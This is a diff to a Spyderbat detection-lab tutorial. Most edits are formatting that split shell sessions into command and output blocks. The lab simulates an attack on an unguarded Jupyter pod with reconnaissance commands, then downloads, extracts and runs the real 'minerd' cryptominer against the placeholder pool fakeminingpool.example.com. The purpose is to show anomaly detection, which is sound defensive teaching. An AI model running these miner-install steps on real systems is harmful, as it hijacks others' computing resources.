@@ -8,16 +8,23 @@ For this scenario, we have set up an unguarded Jupyter Notebook pod within the c
 
 This is a standard Jupyter notebook, running the `jupyter/minimal-notebook` docker image. Select the Python 3 notebook, and run some commands in it.
 
-> **Tip:**
+> <i class="fa fa-fire"></i> **Tip:**
 > 
-> Use the play button or the keyboard shortcut Ctrl-Enter to run code within a code block in the Jupyter Notebook.
+> Use the play button or the keyboard shortcut `Ctrl-Enter` to run code within a code block in the Jupyter Notebook.
 
 ```py
 print("Hello world!")
 ```
+```
+Hello world!
+```
 
 ```sh
 !pip install --upgrade pip setuptools wheel
+```
+```
+...
+Successfully installed pip-24.3.1 setuptools-75.3.0 wheel-0.44.0
 ```
 
 Spyderbat is using the activity we just created to define a "fingerprint" for this container. A container fingerprint tracks all of the processes and connections created in a container during normal operation and can be used to define [Guardian Policies](https://docs.spyderbat.com/concepts/guardian). These policies are used by Spyderbat to detect when anomalous activity occurs, either alerting you or even killing the pod in response, depending on the configuration.
@@ -42,21 +49,39 @@ Now that we know the policy works, let's put it in enforce mode. De-select the d
 
 Next, let's simulate a malicious use of the Jupyter Notebook. Switch back to the Jupyter Notebook terminal, and run some exploration commands:
 
+```sh
+id
 ```
-(base) jovyan@jupyter-notebook-75ffff97fd-r4xxg:~$ id
+```
 uid=1000(jovyan) gid=100(users) groups=100(users)
-(base) jovyan@jupyter-notebook-75ffff97fd-r4xxg:~$ sudo -l
+```
+```sh
+sudo -l
+```
+```
 [sudo] password for jovyan: 
 Sorry, try again.
 [sudo] password for jovyan:^C 
 sudo: 1 incorrect password attempt
-(base) jovyan@jupyter-notebook-75ffff97fd-r4xxg:~$ ping -n 3 sourceforge.net
+```
+
+> <i class="fa fa-fire"></i> **Tip:**
+> 
+> Use `Ctrl-C` to cancel password input.
+
+```sh
+ping -n 3 sourceforge.net
+```
+```
 bash: ping: command not found
-(base) jovyan@jupyter-notebook-75ffff97fd-r4xxg:~$ curl sourceforge.net > /dev/null
+```
+```sh
+curl sourceforge.net > /dev/null
+```
+```
   % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                  Dload  Upload   Total   Spent    Left  Speed
   0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0
-(base) jovyan@jupyter-notebook-75ffff97fd-r4xxg:~$ 
 ```
 
 Looks like we don't have sudo access, there aren't many tools (like ping), but we can connect to SourceForge. Luckily, that is all we need to install a crypto miner. First, we can check that there aren't already any crypto miners installed on this system (given how poor the security would be if this were truly deployed):
@@ -73,7 +98,9 @@ tar -xzf download
 ./minerd --url fakeminingpool.example.com -u ME -p passwd
 ```
 
-> Note: this is a real cryptominer, but is not configured to connect to a real service.
+> <i class="fa-solid fa-circle-info"></i> **Note:**
+> 
+> This is a real cryptominer, but is not configured to connect to a real service.
 
 ## Investigation
 
